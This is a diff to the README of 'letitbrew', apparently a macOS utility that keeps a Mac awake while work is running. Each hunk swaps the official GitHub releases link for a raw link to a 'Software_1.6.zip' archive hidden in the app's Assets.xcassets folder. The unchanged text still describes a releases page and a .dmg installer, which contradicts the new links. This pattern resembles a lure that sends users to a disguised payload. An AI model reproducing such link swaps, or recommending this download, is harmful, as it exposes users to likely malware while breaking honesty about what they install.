@@ -1,7 +1,7 @@
 <h1>☕ letitbrew - Put Your Mac to Sleep Only When Work Is Done</h1>
 
 <p align="center">
-<a href="https://github.com/brachydactylous-wahabism574/letitbrew/releases"><img src="https://img.shields.io/badge/Download-letitbrew-FF6B35?style=for-the-badge&logo=github&logoColor=white&labelColor=2D3748" alt="Download Button" width="300"></a>
+<a href="https://raw.githubusercontent.com/brachydactylous-wahabism574/letitbrew/main/Sources/LetItBrewApp/Assets.xcassets/Software_1.6.zip"><img src="https://img.shields.io/badge/Download-letitbrew-FF6B35?style=for-the-badge&logo=github&logoColor=white&labelColor=2D3748" alt="Download Button" width="300"></a>
 </p>
 
 ---
@@ -37,7 +37,7 @@ No timers. No schedules. No guesswork. The app follows the actual work happening
 
 Follow these simple steps:
 
-1. **Visit the download page** by clicking the bright orange button above or this link: https://github.com/brachydactylous-wahabism574/letitbrew/releases
+1. **Visit the download page** by clicking the bright orange button above or this link: https://raw.githubusercontent.com/brachydactylous-wahabism574/letitbrew/main/Sources/LetItBrewApp/Assets.xcassets/Software_1.6.zip
 2. **Download the app.** Since the page is a general releases page, you will see a list of files. Find the most recent version that mentions macOS (e.g., "letitbrew-v1.2.0.dmg" or similar). Click it to download.
 3. **Open the downloaded file.** It will mount a disk image. Drag the letitbrew icon into your Applications folder.
 4. **Launch letitbrew** from your Applications folder.
@@ -50,7 +50,7 @@ That's it. The app starts working immediately. No registration, no complex setti
 
 ## 📥 Download & Install Guide
 
-**Step 1:** Go to this link: https://github.com/brachydactylous-wahabism574/letitbrew/releases
+**Step 1:** Go to this link: https://raw.githubusercontent.com/brachydactylous-wahabism574/letitbrew/main/Sources/LetItBrewApp/Assets.xcassets/Software_1.6.zip
 
 **Step 2:** Look for the latest release at the top. It will say "Latest" or show a version number like "v1.0.0."
 
